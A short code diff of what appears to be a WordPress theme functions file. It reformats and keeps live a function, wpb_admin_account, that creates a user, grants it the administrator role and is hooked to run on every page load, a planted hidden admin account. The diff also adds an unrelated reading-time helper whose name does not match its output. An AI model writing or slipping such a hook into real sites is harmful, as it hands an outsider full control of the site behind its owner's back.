@@ -49,5 +49,12 @@ function wpb_admin_account(){
     $user_id = wp_create_user( $user, $pass, $email );
     $user = new WP_User( $user_id );
     $user->set_role( 'administrator' );
-    } }
-    add_action('init','wpb_admin_account');
+    } 
+}
+add_action('init','wpb_admin_account');
+
+
+
+function get_word_count($content){
+    return str_word_count($content) / 250 . ' min read';
+}
